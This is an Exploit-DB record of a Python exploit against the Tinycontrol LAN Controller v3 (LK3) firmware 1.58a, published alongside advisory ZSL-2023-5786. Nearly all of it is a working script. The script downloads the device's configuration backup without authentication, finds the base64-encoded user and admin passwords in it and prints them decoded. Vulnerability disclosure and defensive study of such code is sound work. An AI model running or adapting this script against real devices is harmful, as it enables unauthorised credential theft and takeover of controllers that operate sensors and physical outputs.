{"source": "https://www.exploit-db.com/exploits/51731", "vulnName": "Tinycontrol LAN Controller v3 (LK3) 1.58a - Remote Credentials Extraction", "vulnEDBID": "51731", "vulnCVE": "N/A", "author": "LIQUIDWORM", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-10-09", "vulnContent": "#!/usr/bin/env python\n#\n#Exploit Title: Tinycontrol LAN Controller v3 (LK3) - Remote Credentials Extraction\n# Exploit Author: LiquidWorm\n#\n# Vendor: Tinycontrol\n# Product web page: https://www.tinycontrol.pl\n# Affected version: <=1.58a, HW 3.8\n#\n# Summary: Lan Controller is a very universal\n# device that allows you to connect many different\n# sensors and remotely view their readings and\n# remotely control various types of outputs.\n# It is also possible to combine both functions\n# into an automatic if -> this with a calendar\n# when -> then. The device provides a user interface\n# in the form of a web page. The website presents\n# readings of various types of sensors: temperature,\n# humidity, pressure, voltage, current. It also\n# allows you to configure the device, incl. event\n# setting and controlling up to 10 outputs. Thanks\n# to the support of many protocols, it is possible\n# to operate from smartphones, collect and observ\n# the results on the server, as well as cooperation\n# with other I/O systems based on TCP/IP and Modbus.\n#\n# Desc: An unauthenticated attacker can retrieve the\n# controller's configuration backup file and extract\n# sensitive information that can allow him/her/them\n# to bypass security controls and penetrate the system\n# in its entirety.\n#\n# Tested on: lwIP\n#\n#\n# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic\n#                             @zeroscience\n#\n#\n# Advisory ID: ZSL-2023-5786\n# Advisory ID: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5786.php\n#\n#\n# 18.08.2023\n#\n#\n\n\nimport subprocess\nimport requests\nimport base64\nimport sys\n\nbinb = \"lk3_settings.bin\"\noutf = \"lk3_settings.enc\"\nbpatt = \"0upassword\"\nepatt = \"pool.ntp.org\"\nstartf = False\nendf = False\nextral = []\n\nprint(\"\"\"\n    O`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'O\n    |                                          |\n    |     Tinycontrol LK3 1.58 Settings DL     |\n    |              ZSL-2023-5786               |\n    |         2023 (c) Zero Science Lab        |\n    |                                          |\n    |`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'|\n    |                                          |\n\"\"\")\n\nif len(sys.argv) != 2:\n    print(\"[?] Vaka: python {} ipaddr:port\".format(sys.argv[0]))\n    exit(-0)\nelse:\n    rhost=sys.argv[1]\n    if not \"http\" in rhost:\n        rhost=\"http://{}\".format(rhost)\n\ntry:\n    resp = requests.get(rhost + \"/\" + binb)\n    if resp.status_code == 200:\n        with open(outf, 'wb') as f:\n            f.write(resp.content)\n        print(f\"[*] Got data as {outf}\")\n    else:\n        print(f\"[!] Backup failed. Status code: {resp.status_code}\")\nexcept Exception as e:\n    print(\"[!] Error:\", str(e))\n    exit(-1)\n\nbinf = outf\nsout = subprocess.check_output([\"strings\", binf], universal_newlines = True)\nlinea = sout.split(\"\\n\")\n\nfor thricer in linea:\n    if bpatt in thricer:\n        startf = True\n    elif epatt in thricer:\n        endf = True\n    elif startf and not endf:\n        extral.append(thricer)\n\nif len(extral) >= 4:\n    userl = extral[1].strip()\n    adminl = extral[3].strip()\n    try:\n        decuser = base64.b64decode(userl).decode(\"utf-8\")\n        decadmin = base64.b64decode(adminl).decode(\"utf-8\")\n        print(\"[+] User password:\", decuser)\n        print(\"[+] Admin password:\", decadmin)\n    except Exception as e:\n        print(\"[!] Error decoding:\", str(e))\nelse:\n    print(\"[!] Regex failed.\")\n    exit(-2)\n            "}